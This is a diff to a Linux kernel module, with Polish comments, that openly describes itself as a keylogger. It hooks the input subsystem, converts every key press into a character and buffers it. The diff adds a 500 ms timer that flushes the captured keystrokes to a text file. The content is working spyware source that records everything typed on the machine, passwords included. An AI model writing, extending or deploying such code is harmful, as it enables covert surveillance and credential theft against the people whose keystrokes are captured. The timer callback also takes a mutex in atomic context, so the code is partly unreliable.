@@ -6,18 +6,21 @@
 #include <linux/uaccess.h>
 #include <linux/slab.h>
 #include <linux/mutex.h>
+#include <linux/timer.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("281443-279460");
-MODULE_DESCRIPTION("Keylogger that writes keys as characters to a text file");
+MODULE_DESCRIPTION("Keylogger that writes keys as characters to a text file with delayed writing");
 MODULE_VERSION("1.0");
 
 static struct input_handler keylogger_handler;
 static struct file *file = NULL;
 static struct mutex keylog_mutex;  // Mutex do synchronizacji zapisów
-
 static char log_buffer[256];  // Bufor na naciśnięte klawisze
 static int buffer_len = 0;
+static struct timer_list keylog_timer;
+static unsigned long last_key_time = 0;
+#define TIMEOUT_MS 500  // Czas oczekiwania (500 ms) przed zapisaniem do pliku
 
 // Funkcja do mapowania kodu klawisza na znak
 static char keycode_to_char(unsigned int code) {
@@ -39,7 +42,7 @@ static char keycode_to_char(unsigned int code) {
     return '\0';  // Zwróć pusty znak, jeśli klawisz nie jest obsługiwany
 }
 
-// Funkcja zapisująca naciśnięte klawisze do pliku (raz na kilka naciśnięć)
+// Funkcja zapisująca naciśnięte klawisze do pliku
 static void log_key_to_file(void) {
     if (buffer_len > 0) {
         mutex_lock(&keylog_mutex);
@@ -55,6 +58,11 @@ static void log_key_to_file(void) {
     }
 }
 
+// Funkcja, która uruchamia zapis do pliku po upływie czasu
+static void keylog_timer_fn(struct timer_list *t) {
+    log_key_to_file();  // Zapisujemy do pliku
+}
+
 // Funkcja obsługująca zdarzenie naciśnięcia klawisza
 static void keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
     if (type == EV_KEY && value == 1) {  // Zdarzenie naciśnięcia klawisza
@@ -65,10 +73,16 @@ static void keylogger_event(struct input_handle *handle, unsigned int type, unsi
                 buffer_len = 0;  // Zresetuj bufor, jeśli jest pełny
             }
 
-            // Zapisujemy do pliku co 5 naciśnięć klawiszy
-            if (buffer_len > 5) {
-                log_key_to_file();  // Zapisz do pliku
+            // Ustaw timer do zapisu
+            if (time_before(jiffies, last_key_time + msecs_to_jiffies(TIMEOUT_MS))) {
+                // Jeśli ostatni zapis był mniej niż TIMEOUT_MS ms temu, resetujemy timer
+                mod_timer(&keylog_timer, jiffies + msecs_to_jiffies(TIMEOUT_MS));
+            } else {
+                // Zapisujemy do pliku natychmiastowo, jeśli minął wystarczający czas
+                log_key_to_file();
             }
+
+            last_key_time = jiffies;  // Aktualizujemy czas ostatniego naciśnięcia
         }
     }
 }
@@ -127,6 +141,9 @@ static int __init keylogger_init(void) {
         return PTR_ERR(file);
     }
 
+    // Inicjalizujemy timer
+    timer_setup(&keylog_timer, keylog_timer_fn, 0);
+
     // Rejestrujemy handlera wejścia
     return input_register_handler(&keylogger_handler);
 }
@@ -136,6 +153,9 @@ static void __exit keylogger_exit(void) {
     // Zamykamy plik
     if (file)
         filp_close(file, NULL);
+
+    // Anulujemy timer
+    del_timer_sync(&keylog_timer);
 
     // Wyrejestrowujemy handlera wejścia
     input_unregister_handler(&keylogger_handler);
